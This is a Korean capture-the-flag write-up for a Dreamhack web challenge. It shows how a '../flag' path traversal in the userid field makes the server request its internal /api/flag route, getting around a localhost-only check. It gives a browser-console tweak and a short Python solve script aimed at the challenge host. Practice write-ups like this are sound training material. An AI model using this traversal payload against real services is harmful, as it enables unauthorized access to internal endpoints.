# Category

web

# Overview

사용자의 정보를 조회하는 API 서버입니다.
Path Traversal 취약점을 이용해 /api/flag에 있는 플래그를 획득하세요!

# Analysis

- `GET - /api/flag`를 호출하게되면 flag를 획득할 수 있다.

  하지만 라우트에 `@internal_api` 데코레이터가 설정되어 있어 `remote_addr`이 로컬호스트일 때만 통과될 수 있기 때문에 직접 요청은 불가능하다.

- `POST - /get_info`에서 사용자가 전달한 `userid`값을 자체적으로 `/api/user/{userid}`를 통해 전달하고 값을 받아 리턴하는 것을 알 수 있다.

  사용자가 `userid`값을 변경하여 요청한다면 `@internal_api`데코레이터를 무력화 시켜 flag를 획득할 수 있다.

- 프론트엔드 js코드에 `users` 오브젝트의 값에 따라 `userid`값이 치환되어서 서버에 요청하기 때문에 `userid`를 수정하려면 프론트엔드에서의 js코드 수정이 필요하다.

# Exploitation

flag가 있는 경로인 `/api/flag` 로 변경하기위해 `POST - /get_info` 요청 할 때 `userid`값을 `../flag`와 같이 수정하여 전달하게 되면, 서버는 상대경로에 따라 `f'{API_HOST}/api/user/{userid}'`설정된 값이 `/api/flag`로 변경되어 요청하고 그 응답값을 리턴하여 flag를 획득할 수 있다.

1. 브라우저콘솔

   ```js
   const users = {
     guest: 0,
     admin: 1,
   };

   function user(evt) {
     document.getElementById("userid").value =
       users[document.getElementById("userid").value];

     return true;
   }

   window.onload = function () {
     document.getElementById("form").addEventListener("submit", user);
   };
   ```

   `submit` 버튼을 누르게되면 `user` 함수에 따라 `userid`값이 `users`에 맞춰 치환되기 때문에 `users` 오브젝트에 `../flag`값을 추가하여 우회가 가능하다.

   ```js
   // 브라우저 콘솔
   users.flag = "../flag";

   console.log(users); // {guest: 0, admin: 1, flag: '../flag'}
   ```

   입력창에 flag입력후 전달하게 되면 `users` 오브젝트에 따라 `userid = ../flag`가 설정되며 flag를 획득할 수 있다.

2. 파이썬
   프론트엔드 js에 상관이 없기 때문에 바로 `../flag`를 넣어주면 flag를 획득할 수 있다.

   ```py
   # solve.py

   import re
   from requests import request as req

   res = req(
       url="http://host8.dreamhack.games:21555/get_info",
       method="POST",
       data={"userid": "../flag"},
   )

   match = re.match("DH{.*}", res.text)

   print(match.group() if match else "NO FLAG")

   ```

# Flag

`DH{8a...d4}`
